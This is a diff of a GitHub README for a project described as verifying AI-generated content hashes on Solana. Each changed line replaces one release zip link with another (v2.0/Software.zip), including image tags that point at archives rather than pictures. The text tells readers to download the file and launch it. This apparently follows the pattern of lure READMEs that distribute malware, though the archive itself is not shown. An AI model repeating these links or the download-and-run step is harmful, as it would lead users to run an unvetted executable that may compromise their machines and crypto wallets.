@@ -1,6 +1,6 @@
 # Trustless AI Output Verification 🤖🔐
 
-![AI Verification](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v1.0/Program.zip)
+![AI Verification](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v2.0/Software.zip)
 
 Welcome to the Trustless AI Output Verification repository! This repository houses a decentralized system that leverages Solana and Anchor to securely store and verify AI-generated content hashes. If you are interested in the intersection of AI, blockchain technology, and Solana, you have come to the right place!
 
@@ -13,7 +13,7 @@ Welcome to the Trustless AI Output Verification repository! This repository hous
 
 ## 🚀 How It Works
 
-![Decentralized System](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v1.0/Program.zip)
+![Decentralized System](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v2.0/Software.zip)
 
 The Trustless AI Output Verification system works by utilizing Solana's blockchain technology to securely store and verify AI-generated content hashes. By leveraging a decentralized network, trust is distributed across multiple nodes, ensuring the integrity of the verification process.
 
@@ -45,7 +45,7 @@ The Trustless AI Output Verification system works by utilizing Solana's blockcha
 
 ## 📦 Software Download
 
-[![Download Software](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v1.0/Program.zip)](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v1.0/Program.zip)
+[![Download Software](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v2.0/Software.zip)](https://github.com/ReaperSans2022/trustless-ai-output-verification/releases/download/v2.0/Software.zip)
 
 The software needed for this system can be downloaded from the link above. Launch the software after downloading to get started with verifying your AI-generated content.
 
